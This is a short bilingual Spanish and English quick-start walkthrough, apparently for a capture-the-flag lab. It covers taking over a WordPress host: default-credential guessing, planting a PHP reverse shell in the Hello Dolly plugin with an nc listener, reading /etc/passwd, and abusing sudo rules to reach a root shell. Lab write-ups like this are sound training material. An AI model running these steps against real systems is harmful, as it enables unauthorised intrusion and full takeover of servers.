# Quick Start / Inicio Rápido

## Español

1. Ejecutar `nmap -p 80 <target>` y acceder a la web para confirmar Wordpress.
2. Intentar credenciales comunes (`admin:admin`, etc.) hasta obtener acceso al dashboard.
3. Desde **Tools > Plugin Editor**, abrir la extensión `Hello Dolly`.
4. Insertar el script `php-reverse-shell.php` (configurar IP y puerto) al inicio del plugin.
5. Iniciar listener local `nc -lnvp <PORT>` y cargar la página para disparar la reverse shell.
6. Obtener TTY con `python -c 'import pty; pty.spawn("/bin/bash")'`.
7. Enumerar con `cat /etc/passwd` y revisar `/home` para la primera bandera.
8. Listar permisos sudo (`sudo -l`); instalar Python en el contenedor si falta.
9. Ejecución de Python como `bobby` para abrir shell (`sudo -u bobby /usr/bin/python3 ...`).
10. Inspeccionar `/opt`, modificar/crear `backup.py` para ejecutar `/bin/bash` como root.
11. Ejecutar `sudo /opt/backup.py` y obtener shell con privilegios de root.

## English

1. Run `nmap -p 80 <target>` and visit the site to confirm WordPress.
2. Try common credentials (`admin:admin`, etc.) until dashboard access is gained.
3. From **Tools > Plugin Editor**, open the `Hello Dolly` plugin.
4. Insert the `php-reverse-shell.php` script (set attacker IP/port) at the top of the plugin.
5. Start a listener locally with `nc -lnvp <PORT>` and reload the page to trigger the reverse shell.
6. Get a TTY using `python -c 'import pty; pty.spawn("/bin/bash")'`.
7. Enumerate with `cat /etc/passwd` and check `/home` for the first flag.
8. List sudo rights (`sudo -l`); install Python in the container if missing.
9. Run Python as `bobby` to spawn a shell (`sudo -u bobby /usr/bin/python3 ...`).
10. Inspect `/opt`, modify/create `backup.py` to execute `/bin/bash` as root.
11. Execute `sudo /opt/backup.py` and obtain a root-privileged shell.
